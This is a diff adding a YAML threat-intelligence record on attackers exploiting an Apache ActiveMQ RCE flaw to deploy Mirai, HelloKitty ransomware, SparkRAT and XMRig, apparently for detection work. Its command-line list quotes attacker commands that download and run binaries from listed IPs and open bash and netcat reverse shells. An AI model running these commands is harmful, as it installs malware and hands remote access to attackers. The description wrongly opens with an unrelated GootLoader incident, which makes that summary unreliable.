@@ -1,0 +1,86 @@
+description: In December 2022, the Cybereason Incident Response (IR) team investigated
+  an incident involving new deployment methods of GootLoader. This report examines
+  an incident on a Linux server leveraging a Remote Code Execution (RCE) vulnerability
+  in Apache ActiveMQ to download payloads like Mirai Botnet, HelloKitty Ransomware,
+  SparkRAT, and XMRig.
+attribution: Multiple threat actors
+malware_families:
+- GootLoader
+- Mirai Botnet
+- HelloKitty Ransomware
+- SparkRAT
+- XMRig
+- ConnectBack
+TTPs:
+  processes:
+  - Apache ActiveMQ Artemis/Classic
+  - wget
+  - curl
+  - bash
+  - sh
+  - python
+  - netcat
+  - xmrig
+  commandline:
+  - wget http://82.115.220[.]81/bins/x86
+  - curl http://82.115.220[.]81/bins/x86
+  - bash -i >& /dev/tcp/38.54.88.83/9099 0>&1 && nc 38.54.88.83 9099 -e /bin/bash
+  - nc 91.192.223[.]44 29123 <&171 >&171 2>&171
+  - python -m http.server
+  - apt install python3.7
+  - apt install netstat
+  - chmod 777 /tmp/.X12-unix
+  - ./x86
+  - /tmp/linux.sh
+  - curl http://45.32.120.181/1 -o /tmp/.X12-unix
+  - nohup /tmp/1 > /dev/null &
+  - wget http://156.96.155[.]233:8855/Linux64;chmod 777 Linux64; ./Linux64;rm f Linux
+  - curl http://156.96.155[.]233:8855/YqA4eE7nQGlrOXB6snEZqA
+  - bash -c cd /tmp;wget http://156.96.155.233:8855/1 sh
+  - curl http://172.245.16.125/down
+  - wget -O /tmp/.bash2 http://172.245.16.125/5564
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: wget
+    destination: http://82.115.220[.]81/bins/x86
+  - executable: curl
+    destination: http://82.115.220[.]81/bins/x86
+  - executable: wget
+    destination: http://45.32.120.181/linux.sh
+  - executable: curl
+    destination: http://45.32.120.181/1
+  - executable: wget
+    destination: http://156.96.155[.]233:8855/Linux64
+  - executable: curl
+    destination: http://156.96.155[.]233:8855/YqA4eE7nQGlrOXB6snEZqA
+  - executable: wget
+    destination: http://172.245.16.125/down
+  - executable: curl
+    destination: http://172.245.16.125/down
+  file_modifications:
+  - /tmp/.X12-unix
+  - /tmp/.bash2
+  - /root/.bash_history
+  persistence:
+  - Reverse shell via Netcat
+  - Reverse shell using file descriptor in bash
+  pipes: ''
+  process_relations: ''
+IOCs:
+- 82.115.220[.]81
+- 45.32.120[.]181
+- 156.96.155[.]233
+- 176.105.255[.]60
+- 172.245.16[.]125
+- 91.192.223[.]44
+- 38.54.88[.]83
+authors:
+- Robin Plumer
+- KengWei Lin
+- Kotaro Ogino
+reference: https://www.cybereason.com/blog/beware-of-the-messengers-exploiting-activemq-vulnerability
+date_of_publication: May 19, 2025
+file_creation_date: May 19, 2025
